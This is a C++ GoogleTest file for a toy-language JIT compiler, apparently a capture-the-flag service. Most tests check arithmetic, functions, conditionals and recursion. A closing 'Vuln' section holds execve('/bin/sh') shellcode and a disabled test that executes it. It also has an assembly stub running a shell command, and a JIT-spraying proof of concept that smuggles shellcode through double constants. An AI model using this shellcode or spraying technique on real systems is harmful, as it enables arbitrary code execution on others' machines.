#include <cstring>

#include <unistd.h>
#include <sys/mman.h>

#include <gtest/gtest.h>
#include <glog/logging.h>

#include <utils/defer/defer.h>

#include <lexer/lexer.h>
#include <parser/parser.h>
#include <compiler/compiler.h>
#include <translator/translator.h>

void assertProgramResult(const std::string &program, double result) {
    auto tokens = TokenizeString(program);
    ASSERT_EQ(tokens.ErrorMessage, "");
    ASSERT_TRUE(tokens.Success);
    auto parsed = ParseTokens(tokens.Tokens);
    ASSERT_EQ(parsed.ErrorMessage, "");
    ASSERT_TRUE(parsed.Success);
    auto compiled = CompileToAssembly(parsed.ProgramNode);
    ASSERT_EQ(compiled.ErrorMessage, "");
    ASSERT_TRUE(compiled.Success);
    auto translated = TranslateAssembly(compiled.AssemblyCode);
    ASSERT_EQ(translated.ErrorMessage, "");
    ASSERT_TRUE(translated.Success);
    auto pagesCount = (translated.Translated->size() + getpagesize()) / getpagesize();
    auto size = pagesCount * getpagesize();
    typedef double (*vptr)();
    auto region = mmap(nullptr, size, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        ASSERT_FALSE(true);
        return;
    }
    Defer u(munmap, region, size);
    std::memcpy(reinterpret_cast<char*>(region), translated.Translated->data(), translated.Translated->size());
    if (mprotect(region, size, PROT_EXEC | PROT_READ) < 0) {
        perror("mprotect");
        ASSERT_FALSE(true);
        return;
    }
    auto l = reinterpret_cast<vptr>(region);
    double r = l();
    if (std::abs(r - result) > 1e-6) {
        ASSERT_DOUBLE_EQ(r, result);
    }
}

TEST(Functional, JustReturnValue) {
    assertProgramResult(R"(
fun main() {
    return 3.141592;
}
)", 3.141592);
}

TEST(Functional, JustReturnSumOfTwoConstants) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 + 2.718281828;
}
)", 5.8598738);
}

TEST(Functional, JustReturnSumOfThreeConstants) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 + 2.718281828 + 1488;
}
)", 1493.859873828);
}

TEST(Functional, JustReturnSumOfTwoMinusAnother) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 + 2.718281828 - 1488;
}
)", -1482.140126172);
}

TEST(Functional, JustReturnMulOfTwoNumers) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 * 2.718281828;
}
)", 8.5397324445901752);
}

TEST(Functional, JustReturnMulOfThreeNumers) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 * 2.718281828 * 1337;
}
)", 11417.622278417064);
}

TEST(Functional, JustReturnMulOfTwoNumersAndDivideByAnother) {
    assertProgramResult(R"(
fun main() {
    return 3.141592 * 2.718281828 / -1337;
}
)", -0.0063872344387361068);
}

TEST(Functional, ReturnOfMulAndSum) {
    assertProgramResult(R"(
fun main() {
    return (3.141592 - 2.718281828) * -1337 + 12.432 / 87;
}
)", -565.82280341227636);
}

TEST(Functional, ReturnGlobalConstant) {
    assertProgramResult(R"(
pi = 3.1415927;
fun main() {
    return pi;
}
)", 3.1415927);
}

TEST(Functional, ReturnExpressionWithGlobalConstants) {
    assertProgramResult(R"(
pi = 3.1415927;
e = 2.7;
fun main() {
    return (pi * pi * e / pi / e - pi + e) * pi - e;
}
)", 5.782300290000);
}

TEST(Functional, ReturnVariable) {
    assertProgramResult(R"(
fun main() {
    pi = 3.1415927;
    return pi;
}
)", 3.1415927);
}

TEST(Functional, ReturnVariablesExpression) {
    assertProgramResult(R"(
fun main() {
    pi = 3.1415927;
    e = 2.7;
    k = 1337;
    return pi * e / k;
}
)", 0.0063442784517576661);
}

TEST(Functional, ReturnRedefinedVariable) {
    assertProgramResult(R"(
fun main() {
    pi = 2.7;
    pi = 3.1415927;
    return pi;
}
)", 3.1415927);
}

TEST(Functional, StatementsAfteReturn) {
    assertProgramResult(R"(
fun main() {
    pi = 3.1415927;
    return pi;
    pi = 2.7;
    return pi;
}
)", 3.1415927);
}

TEST(Functional, FunctionCallNoArguments) {
    assertProgramResult(R"(
fun f() {
    return 1234567;
}

fun main() {
    return f();
}
)", 1234567);
}

TEST(Functional, FunctionCallOneArgument) {
    assertProgramResult(R"(
fun f(x) {
    return x;
}

fun main() {
    return f(42);
}
)", 42.0);
}

TEST(Functional, FunctionCallTwoArguments) {
    assertProgramResult(R"(
fun f(x, y) {
    return x + y;
}

fun main() {
    return f(3.1415927, 3.1415927);
}
)", 6.2831853);
}

TEST(Functional, FunctionCallThreeArguments) {
    assertProgramResult(R"(
fun f(x, y, z) {
    return (x + y) * z;
}

fun main() {
    return f(3.1415927, 2.7, 1337);
}
)", 7810.20943989);
}

TEST(Functional, FunctionCallWithFunctionCallAsArgument) {
    assertProgramResult(R"(
fun a(x, y, z) {
    return x + y + z;
}

fun b(x, y, z) {
    return a(x, y, z) * a(x, y, z);
}

fun main() {
    return a(1, 2, 3) + b(1, 2, 3) * b(a(1, 2, 3), a(1, 2, 3), a(1, 2, 3));
}
)", 11670);
}

TEST(Functional, ConditionWithoutElseFalseGreat) {
    assertProgramResult(R"(
fun main() {
    if (1 > 2) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseTrueGreat) {
    assertProgramResult(R"(
fun main() {
    if (3.14 > 2) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseTrueLess) {
    assertProgramResult(R"(
fun main() {
    if (1 < 2) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseFalseLess) {
    assertProgramResult(R"(
fun main() {
    if (3.14 < 2) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseFalseEq) {
    assertProgramResult(R"(
fun main() {
    if (1 == 2) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseTrueEq) {
    assertProgramResult(R"(
fun main() {
    if (1 == 1) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseFalseNeq) {
    assertProgramResult(R"(
fun main() {
    if (1 != 1) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseTrueNeq) {
    assertProgramResult(R"(
fun main() {
    if (1 != 1.00001) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseFalseGe) {
    assertProgramResult(R"(
fun main() {
    if (1 >= 2) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseTrueGeBecauseOfEq) {
    assertProgramResult(R"(
fun main() {
    if (1 >= 1) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseTrueGeBecauseOfGreat) {
    assertProgramResult(R"(
fun main() {
    if (2 >= 1) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseFlaseGe) {
    assertProgramResult(R"(
fun main() {
    if (0.99999 >= 1) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithoutElseTrueLeBecauseOfEq) {
    assertProgramResult(R"(
fun main() {
    if (1 <= 1) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseTrueLeBecauseOfLess) {
    assertProgramResult(R"(
fun main() {
    if (0.99999 <= 1) {
        return 1;
    }
    return 2;
}
)", 1);
}

TEST(Functional, ConditionWithoutElseFalseLe) {
    assertProgramResult(R"(
fun main() {
    if (0.99999 <= (0.99999 - 0.0000001)) {
        return 1;
    }
    return 2;
}
)", 2);
}

TEST(Functional, ConditionWithElseTrue) {
    assertProgramResult(R"(
fun main() {
    pi = 3.14;
    if (pi > 3) {
        ans = 1;
    } else {
        ans = 2;
    }
    return ans;
}
)", 1);
}

TEST(Functional, ConditionWithElseFalse) {
    assertProgramResult(R"(
fun main() {
    pi = 3.14;
    if (pi > 4) {
        ans = 1;
    } else {
        ans = 2;
    }
    return ans;
}
)", 2);
}

TEST(Functional, Factorial) {
    assertProgramResult(R"(
fun factorial(n) {
    if (n <= 1) {
        return 1;
    }

    return n * factorial(n - 1);
}

fun main() {
    return factorial(10);
}
)", 3628800);
}

TEST(Functional, Fibonacci1) {
    assertProgramResult(R"(
fun fib(a, b, n) {
    c = a + b;
    a = b;
    b = c;
    if (n <= 0) {
        return b;
    } else {
        return fib(a, b, n - 1);
    }
}

fun main() {
    return fib(0, 1, 5);
}
)", 13);
}

TEST(Functional, Fibonacci2) {
    assertProgramResult(R"(
fun fib(a, b, n) {
    c = a + b;
    a = b;
    b = c;
    if (n <= 0) {
        return b;
    } else {
        return fib(a, b, n - 1);
    }
}

fun main() {
    return fib(0, 1, 6);
}
)", 21);
}

TEST(Functional, NegExpr) {
    assertProgramResult(R"(
fun main() {
    return -(5 +6);
}
)", -11);
}

TEST(Functional, NegNegNeg) {
    assertProgramResult(R"(
fun main() {
    return ---5;
}
)", -5);
}

TEST(Functional, NegNegNegNeg) {
    assertProgramResult(R"(
fun main() {
    return ----5;
}
)", 5);
}

TEST(Functional, Sub) {
    assertProgramResult(R"(
fun main() {
    return 5-6;
}
)", -1);
}

static char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62"
                          "\x69\x6e\x2f\x2f\x73\x68\x50\x48"
                          "\x89\xe7\x52\x57\x48\x89\xe6\x48"
                          "\x31\xc0\xb0\x3b\x0f\x05\x90";

TEST(Vuln, DISABLED_CheckShell) {
    typedef void (*vptr)();

    const auto pageSize = getpagesize();

    auto region = mmap(nullptr, pageSize, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        ASSERT_FALSE(true);
        return;
    }

    std::strcpy(reinterpret_cast<char*>(region), shellcode);

    if (mprotect(region, pageSize, PROT_EXEC) < 0) {
        perror("mprotect");
        ASSERT_FALSE(true);
        return;
    }

    auto l = reinterpret_cast<vptr>(region);

    l();

    munmap(region, pageSize);
}

TEST(Vuln, DoublesFromHexParsedCorrectly) {
    ASSERT_TRUE(sizeof(shellcode) % sizeof(double) == 0);

    union {
        char bytes[sizeof(shellcode)];
        double values[sizeof(bytes) / sizeof(double)];
    };

    std::strcpy(bytes, shellcode);

    for (std::size_t i = 0; i < sizeof(values) / sizeof(double); ++i) {
        std::stringstream ss;
        ss << std::setprecision(30) << values[i];
        double v = std::stod(ss.str());

        for (std::size_t j = 0; j < sizeof(double); ++j) {
            ASSERT_EQ(bytes[i * sizeof(double) + j], *(reinterpret_cast<char*>(&v) + j));
        }
    }
}

TEST(Vuln, DoubleFromHexParsedCorrectly2) {
    auto shellText = R"(
.section .text
.globl _start

_start:
    xor     %rdx, %rdx
    leaq    arg2(%rip), %rsi
    pushq   %rsi
    leaq    arg1(%rip), %rsi
    pushq   %rsi
    leaq    cmd(%rip), %rsi
    pushq   %rsi
    movq    %rsp, %rsi
    leaq    cmd(%rip), %rdi
    movq    $59, %rax
    syscall
    ret

cmd:
    .asciz "/bin/sh"
arg1:
    .asciz "-c"
arg2:
    .asciz "mkdir -p dataexample/ru && rm -f dataexample/ru/ctfructfructfructfructfructfru && find dataexample -type f > dataexample/ru/ctfructfructfructfructfructfru && printf '\\00\\303' >> dataexample/ru/ctfructfructfructfructfructfru"
null:
    .quad 0
    )";

    auto r = TranslateAssembly(shellText);
    ASSERT_TRUE(r.Success);

    while (r.Translated->size() % sizeof(double) != 0) {
        r.Translated->push_back(0x90);
    }

    auto p = reinterpret_cast<double*>(r.Translated->data());

    for (std::size_t i = 0; i < r.Translated->size() / sizeof(double); ++i) {
        std::stringstream ss;
        ss << std::setprecision(30) << p[i];
        LOG(INFO) << ss.str();
        double v;
        ss >> v;

        for (std::size_t j = 0; j < sizeof(double); ++j) {
            ASSERT_EQ((*r.Translated)[i * sizeof(double) + j], *(reinterpret_cast<uint8_t*>(&v) + j));
        }
    }
}

TEST(Vuln, DISABLED_VulnMVP) {
/*
fun main() {
    a = 9.13311275417349147128740860176e+164;
    b = 2.23334226138660938778544477852e+40;
    c = 1.57054810607513511574371074205e+43;
    d = 5.70322518485311116492001613112e-306;
    if (a < b) {
        return a + b + c + d;
    }
}
*/
    assertProgramResult(R"(
a3b5c = 9.5729280743176072948036481258e-308;
a3b5d = 6.17713519068332487832607366568e-308;
a3b5e = 3.08856759534166243916303683284e-308;
a3b5f = -1.13962551584212620632980908507e-244;
a3b5g = -11920.0000000052332325140014291;
a3b5h = -288586343041208000.000000000000000000000000000000;
a3b5i = 1.08805855771401084070533089734e-306;
a3b5j = 1.35452787268204745946619571028e+243;
a3b5k = 2.86530674818711642217458024256e+161;
a3b5l = 2.25851731747621915274049948662e-80;
a3b5m = 1.59959052745373437458011589816e+219;
a3b5n = 2.86530674785977736138496605556e+161;
a3b5o = 2.25851731747621915274049948662e-80;
a3b5p = 5.52559647960564516384938216975e+257;
a3b5q = 3.4653160729132520229722030536e+185;
a3b5r = 1.29503525642399536129001394637e+171;
a3b5s = 1.19782304862903820345902151854e+243;
a3b5t = 7.34483736205704024258100045432e+223;
a3b5u = 9.03623792952455807479791709701e+271;
a3b5v = 4.1707619911344704065794714133e+251;
a3b5w = 2.24694137064508031465041121588e-153;
a3b5x = 7.70880663117687154339151736e+218;
a3b5y = 5.9362114705256860748803432818e+169;
a3b5z = 1.19782304862903820345902151854e+243;
a3b6a = 4.45822432662471531958872096101e+252;
a3b6b = 5.52559648449915692702815701664e+257;
a3b6c = 6.53747834600816911773243398146e-125;
a3b6d = 1.33980497747332409769287086757e-152;
a3b6e = 3.9381538893456823461224877281e-62;
a3b6f = 3.98450022836809606757324942544e+252;
a3b6g = 3.68777420640448786034779946279e+180;
a3b6h = 1.19782282609787404309977881133e+243;
a3b6i = 4.45822432662471531958872096101e+252;
a3b6j = 5.52559648449915692702815701664e+257;
a3b6k = 3.4653160729132520229722030536e+185;
a3b6l = 1.48545777078629185972127173264e-319;
a3b6m = -6.82852702054738014029865729803e-229;

fun main() {
    if (a3b6i < a3b6k) {
        return a3b6m;
    }
}
)", 0.0);
}
